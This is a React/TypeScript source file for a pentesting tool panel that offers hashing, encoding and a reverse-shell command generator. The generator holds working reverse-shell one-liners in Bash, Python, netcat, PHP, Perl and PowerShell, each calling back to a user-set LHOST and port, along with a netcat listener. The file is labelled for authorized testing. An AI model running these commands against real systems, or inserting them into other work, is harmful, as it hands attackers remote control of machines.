import { useState } from "react";
import { Hash, Code, Globe, Terminal, Copy, Check } from "lucide-react";

type ToolTab = "hash" | "encode" | "revshell";

const toolTabs: { id: ToolTab; icon: typeof Hash; label: string }[] = [
  { id: "hash", icon: Hash, label: "Hash" },
  { id: "encode", icon: Code, label: "Encode" },
  { id: "revshell", icon: Terminal, label: "RevShell" },
];

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => {
        navigator.clipboard.writeText(text).catch(() => {});
        setCopied(true);
        setTimeout(() => setCopied(false), 1500);
      }}
      style={{
        background: "none",
        border: "none",
        color: copied ? "#00ff41" : "var(--text-muted)",
        cursor: "pointer",
        padding: 2,
      }}
      title="Copy"
    >
      {copied ? <Check size={10} /> : <Copy size={10} />}
    </button>
  );
}

function ResultBox({ label, value }: { label: string; value: string }) {
  if (!value) return null;
  return (
    <div style={{ marginBottom: 6 }}>
      <div style={{ display: "flex", alignItems: "center", gap: 4, marginBottom: 2 }}>
        <span style={{ fontSize: 9, color: "var(--text-muted)", fontWeight: 600 }}>{label}</span>
        <CopyButton text={value} />
      </div>
      <div
        style={{
          background: "var(--bg-primary)",
          border: "1px solid var(--border-subtle)",
          borderRadius: "var(--radius-sm)",
          padding: "4px 8px",
          fontSize: 10,
          fontFamily: "'JetBrains Mono', monospace",
          color: "var(--text-primary)",
          wordBreak: "break-all",
          userSelect: "all",
        }}
      >
        {value}
      </div>
    </div>
  );
}

function HashTool() {
  const [input, setInput] = useState("");
  const [hashes, setHashes] = useState<{ md5: string; sha1: string; sha256: string }>({ md5: "", sha1: "", sha256: "" });

  const computeHashes = async () => {
    if (!input) return;
    const encoder = new TextEncoder();
    const data = encoder.encode(input);
    const [sha1Buf, sha256Buf] = await Promise.all([
      crypto.subtle.digest("SHA-1", data),
      crypto.subtle.digest("SHA-256", data),
    ]);
    const toHex = (buf: ArrayBuffer) =>
      Array.from(new Uint8Array(buf))
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("");

    // MD5 not available in SubtleCrypto, compute simple version
    const md5 = simpleMD5(input);

    setHashes({
      md5,
      sha1: toHex(sha1Buf),
      sha256: toHex(sha256Buf),
    });
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      <textarea
        value={input}
        onChange={(e) => setInput(e.target.value)}
        placeholder="Enter text to hash..."
        style={{
          background: "var(--bg-primary)",
          border: "1px solid var(--border-subtle)",
          borderRadius: "var(--radius-sm)",
          color: "var(--text-primary)",
          padding: "6px 8px",
          fontSize: 11,
          fontFamily: "'JetBrains Mono', monospace",
          resize: "vertical",
          minHeight: 50,
          outline: "none",
        }}
      />
      <button
        onClick={computeHashes}
        disabled={!input.trim()}
        style={{
          background: input.trim() ? "var(--accent-primary)" : "var(--bg-active)",
          border: "none",
          borderRadius: "var(--radius-sm)",
          color: input.trim() ? "#000" : "var(--text-muted)",
          padding: "5px 12px",
          fontSize: 10,
          fontWeight: 700,
          cursor: input.trim() ? "pointer" : "default",
        }}
      >
        <Hash size={10} style={{ marginRight: 4, verticalAlign: "middle" }} />
        Compute Hashes
      </button>
      <ResultBox label="MD5" value={hashes.md5} />
      <ResultBox label="SHA-1" value={hashes.sha1} />
      <ResultBox label="SHA-256" value={hashes.sha256} />
    </div>
  );
}

function EncodeTool() {
  const [input, setInput] = useState("");
  const [mode, setMode] = useState<"base64" | "url" | "hex">("base64");

  const encode = (): string => {
    if (!input) return "";
    try {
      if (mode === "base64") return btoa(unescape(encodeURIComponent(input)));
      if (mode === "url") return encodeURIComponent(input);
      if (mode === "hex")
        return Array.from(new TextEncoder().encode(input))
          .map((b) => b.toString(16).padStart(2, "0"))
          .join("");
    } catch { return "Error encoding"; }
    return "";
  };

  const decode = (): string => {
    if (!input) return "";
    try {
      if (mode === "base64") return decodeURIComponent(escape(atob(input)));
      if (mode === "url") return decodeURIComponent(input);
      if (mode === "hex") {
        const bytes = input.match(/.{1,2}/g)?.map((b) => parseInt(b, 16)) || [];
        return new TextDecoder().decode(new Uint8Array(bytes));
      }
    } catch { return "Error decoding"; }
    return "";
  };

  const modes = [
    { id: "base64" as const, label: "Base64" },
    { id: "url" as const, label: "URL" },
    { id: "hex" as const, label: "Hex" },
  ];

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      <div style={{ display: "flex", gap: 4 }}>
        {modes.map((m) => (
          <button
            key={m.id}
            onClick={() => setMode(m.id)}
            style={{
              flex: 1,
              padding: "3px 6px",
              fontSize: 9,
              fontWeight: 600,
              borderRadius: 8,
              border: "1px solid",
              borderColor: mode === m.id ? "var(--accent-primary)" : "var(--border-subtle)",
              background: mode === m.id ? "var(--accent-primary)" : "var(--bg-tertiary)",
              color: mode === m.id ? "#000" : "var(--text-secondary)",
              cursor: "pointer",
            }}
          >
            {m.label}
          </button>
        ))}
      </div>
      <textarea
        value={input}
        onChange={(e) => setInput(e.target.value)}
        placeholder="Enter text to encode/decode..."
        style={{
          background: "var(--bg-primary)",
          border: "1px solid var(--border-subtle)",
          borderRadius: "var(--radius-sm)",
          color: "var(--text-primary)",
          padding: "6px 8px",
          fontSize: 11,
          fontFamily: "'JetBrains Mono', monospace",
          resize: "vertical",
          minHeight: 50,
          outline: "none",
        }}
      />
      <ResultBox label={`Encoded (${mode})`} value={encode()} />
      <ResultBox label={`Decoded (${mode})`} value={decode()} />
    </div>
  );
}

const REVSHELL_TEMPLATES = [
  {
    name: "Bash TCP",
    cmd: (ip: string, port: string) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
  },
  {
    name: "Python",
    cmd: (ip: string, port: string) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
  },
  {
    name: "Netcat -e",
    cmd: (ip: string, port: string) => `nc -e /bin/sh ${ip} ${port}`,
  },
  {
    name: "Netcat FIFO",
    cmd: (ip: string, port: string) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
  },
  {
    name: "PHP",
    cmd: (ip: string, port: string) =>
      `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    name: "Perl",
    cmd: (ip: string, port: string) =>
      `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  },
  {
    name: "PowerShell",
    cmd: (ip: string, port: string) =>
      `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,
  },
  {
    name: "Listener (nc)",
    cmd: (_ip: string, port: string) => `nc -lvnp ${port}`,
  },
];

function RevShellTool() {
  const [ip, setIp] = useState("10.10.10.10");
  const [port, setPort] = useState("4444");

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      <div style={{
        padding: "6px 10px",
        background: "rgba(255,0,64,0.08)",
        border: "1px solid rgba(255,0,64,0.2)",
        borderRadius: "var(--radius-sm)",
        fontSize: 9,
        color: "#ff6080",
      }}>
        For authorized penetration testing only
      </div>
      <div style={{ display: "flex", gap: 6 }}>
        <div style={{ flex: 1 }}>
          <label style={{ fontSize: 9, color: "var(--text-muted)", display: "block", marginBottom: 2 }}>
            <Globe size={9} style={{ verticalAlign: "middle", marginRight: 3 }} />LHOST
          </label>
          <input
            value={ip}
            onChange={(e) => setIp(e.target.value)}
            style={{
              width: "100%",
              background: "var(--bg-primary)",
              border: "1px solid var(--border-subtle)",
              borderRadius: "var(--radius-sm)",
              color: "var(--text-primary)",
              padding: "4px 8px",
              fontSize: 11,
              fontFamily: "'JetBrains Mono', monospace",
              outline: "none",
            }}
          />
        </div>
        <div style={{ width: 70 }}>
          <label style={{ fontSize: 9, color: "var(--text-muted)", display: "block", marginBottom: 2 }}>LPORT</label>
          <input
            value={port}
            onChange={(e) => setPort(e.target.value)}
            style={{
              width: "100%",
              background: "var(--bg-primary)",
              border: "1px solid var(--border-subtle)",
              borderRadius: "var(--radius-sm)",
              color: "var(--text-primary)",
              padding: "4px 8px",
              fontSize: 11,
              fontFamily: "'JetBrains Mono', monospace",
              outline: "none",
            }}
          />
        </div>
      </div>
      <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
        {REVSHELL_TEMPLATES.map((t, i) => {
          const cmd = t.cmd(ip, port);
          return (
            <div
              key={i}
              style={{
                background: "var(--bg-tertiary)",
                border: "1px solid var(--border-subtle)",
                borderRadius: "var(--radius-sm)",
                padding: "6px 8px",
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 4, marginBottom: 4 }}>
                <span style={{ fontSize: 10, fontWeight: 700, color: "var(--accent-primary)", flex: 1 }}>
                  {t.name}
                </span>
                <CopyButton text={cmd} />
              </div>
              <pre
                style={{
                  margin: 0,
                  fontSize: 9,
                  fontFamily: "'JetBrains Mono', monospace",
                  color: "var(--text-secondary)",
                  whiteSpace: "pre-wrap",
                  wordBreak: "break-all",
                  lineHeight: 1.4,
                }}
              >
                {cmd}
              </pre>
            </div>
          );
        })}
      </div>
    </div>
  );
}

export function ToolsView() {
  const [activeTab, setActiveTab] = useState<ToolTab>("hash");

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      {/* Tool tabs */}
      <div style={{ display: "flex", gap: 4 }}>
        {toolTabs.map((t) => (
          <button
            key={t.id}
            onClick={() => setActiveTab(t.id)}
            style={{
              flex: 1,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 4,
              padding: "4px 8px",
              fontSize: 10,
              fontWeight: 600,
              borderRadius: 8,
              border: "1px solid",
              borderColor: activeTab === t.id ? "var(--accent-primary)" : "var(--border-subtle)",
              background: activeTab === t.id ? "var(--accent-primary)" : "var(--bg-tertiary)",
              color: activeTab === t.id ? "#000" : "var(--text-secondary)",
              cursor: "pointer",
            }}
          >
            <t.icon size={10} />
            {t.label}
          </button>
        ))}
      </div>

      {/* Tool content */}
      <div>
        {activeTab === "hash" && <HashTool />}
        {activeTab === "encode" && <EncodeTool />}
        {activeTab === "revshell" && <RevShellTool />}
      </div>
    </div>
  );
}

// Simple MD5 implementation (for convenience — not cryptographically used)
function simpleMD5(str: string): string {
  function md5cycle(x: number[], k: number[]) {
    let a = x[0], b = x[1], c = x[2], d = x[3];
    a = ff(a,b,c,d,k[0],7,-680876936); d = ff(d,a,b,c,k[1],12,-389564586); c = ff(c,d,a,b,k[2],17,606105819); b = ff(b,c,d,a,k[3],22,-1044525330);
    a = ff(a,b,c,d,k[4],7,-176418897); d = ff(d,a,b,c,k[5],12,1200080426); c = ff(c,d,a,b,k[6],17,-1473231341); b = ff(b,c,d,a,k[7],22,-45705983);
    a = ff(a,b,c,d,k[8],7,1770035416); d = ff(d,a,b,c,k[9],12,-1958414417); c = ff(c,d,a,b,k[10],17,-42063); b = ff(b,c,d,a,k[11],22,-1990404162);
    a = ff(a,b,c,d,k[12],7,1804603682); d = ff(d,a,b,c,k[13],12,-40341101); c = ff(c,d,a,b,k[14],17,-1502002290); b = ff(b,c,d,a,k[15],22,1236535329);
    a = gg(a,b,c,d,k[1],5,-165796510); d = gg(d,a,b,c,k[6],9,-1069501632); c = gg(c,d,a,b,k[11],14,643717713); b = gg(b,c,d,a,k[0],20,-373897302);
    a = gg(a,b,c,d,k[5],5,-701558691); d = gg(d,a,b,c,k[10],9,38016083); c = gg(c,d,a,b,k[15],14,-660478335); b = gg(b,c,d,a,k[4],20,-405537848);
    a = gg(a,b,c,d,k[9],5,568446438); d = gg(d,a,b,c,k[14],9,-1019803690); c = gg(c,d,a,b,k[3],14,-187363961); b = gg(b,c,d,a,k[8],20,1163531501);
    a = gg(a,b,c,d,k[13],5,-1444681467); d = gg(d,a,b,c,k[2],9,-51403784); c = gg(c,d,a,b,k[7],14,1735328473); b = gg(b,c,d,a,k[12],20,-1926607734);
    a = hh(a,b,c,d,k[5],4,-378558); d = hh(d,a,b,c,k[8],11,-2022574463); c = hh(c,d,a,b,k[11],16,1839030562); b = hh(b,c,d,a,k[14],23,-35309556);
    a = hh(a,b,c,d,k[1],4,-1530992060); d = hh(d,a,b,c,k[4],11,1272893353); c = hh(c,d,a,b,k[7],16,-155497632); b = hh(b,c,d,a,k[10],23,-1094730640);
    a = hh(a,b,c,d,k[13],4,681279174); d = hh(d,a,b,c,k[0],11,-358537222); c = hh(c,d,a,b,k[3],16,-722521979); b = hh(b,c,d,a,k[6],23,76029189);
    a = hh(a,b,c,d,k[9],4,-640364487); d = hh(d,a,b,c,k[12],11,-421815835); c = hh(c,d,a,b,k[15],16,530742520); b = hh(b,c,d,a,k[2],23,-995338651);
    a = ii(a,b,c,d,k[0],6,-198630844); d = ii(d,a,b,c,k[7],10,1126891415); c = ii(c,d,a,b,k[14],15,-1416354905); b = ii(b,c,d,a,k[5],21,-57434055);
    a = ii(a,b,c,d,k[12],6,1700485571); d = ii(d,a,b,c,k[3],10,-1894986606); c = ii(c,d,a,b,k[10],15,-1051523); b = ii(b,c,d,a,k[1],21,-2054922799);
    a = ii(a,b,c,d,k[8],6,1873313359); d = ii(d,a,b,c,k[15],10,-30611744); c = ii(c,d,a,b,k[6],15,-1560198380); b = ii(b,c,d,a,k[13],21,1309151649);
    a = ii(a,b,c,d,k[4],6,-145523070); d = ii(d,a,b,c,k[11],10,-1120210379); c = ii(c,d,a,b,k[2],15,718787259); b = ii(b,c,d,a,k[9],21,-343485551);
    x[0] = add32(a, x[0]); x[1] = add32(b, x[1]); x[2] = add32(c, x[2]); x[3] = add32(d, x[3]);
  }
  function cmn(q: number, a: number, b: number, x: number, s: number, t: number) {
    a = add32(add32(a, q), add32(x, t));
    return add32((a << s) | (a >>> (32 - s)), b);
  }
  function ff(a: number, b: number, c: number, d: number, x: number, s: number, t: number) { return cmn((b & c) | ((~b) & d), a, b, x, s, t); }
  function gg(a: number, b: number, c: number, d: number, x: number, s: number, t: number) { return cmn((b & d) | (c & (~d)), a, b, x, s, t); }
  function hh(a: number, b: number, c: number, d: number, x: number, s: number, t: number) { return cmn(b ^ c ^ d, a, b, x, s, t); }
  function ii(a: number, b: number, c: number, d: number, x: number, s: number, t: number) { return cmn(c ^ (b | (~d)), a, b, x, s, t); }
  function md51(s: string) {
    const n = s.length;
    let state = [1732584193, -271733879, -1732584194, 271733878];
    let i: number;
    for (i = 64; i <= n; i += 64) {
      const block: number[] = [];
      for (let j = i - 64; j < i; j += 4)
        block.push(s.charCodeAt(j) + (s.charCodeAt(j + 1) << 8) + (s.charCodeAt(j + 2) << 16) + (s.charCodeAt(j + 3) << 24));
      md5cycle(state, block);
    }
    const tail: number[] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
    for (let j = 0; j < n % 64; j++)
      tail[j >> 2] |= s.charCodeAt(i - 64 + j) << ((j % 4) << 3);
    tail[(n % 64) >> 2] |= 0x80 << (((n % 64) % 4) << 3);
    if (n % 64 > 55) {
      md5cycle(state, tail);
      for (let j = 0; j < 16; j++) tail[j] = 0;
    }
    tail[14] = n * 8;
    md5cycle(state, tail);
    return state;
  }
  function add32(a: number, b: number) { return (a + b) & 0xFFFFFFFF; }
  function hex(x: number[]) {
    const chars = "0123456789abcdef";
    let s = "";
    for (let i = 0; i < x.length; i++)
      for (let j = 0; j < 4; j++)
        s += chars.charAt((x[i] >> (j * 8 + 4)) & 0xF) + chars.charAt((x[i] >> (j * 8)) & 0xF);
    return s;
  }
  return hex(md51(str));
}
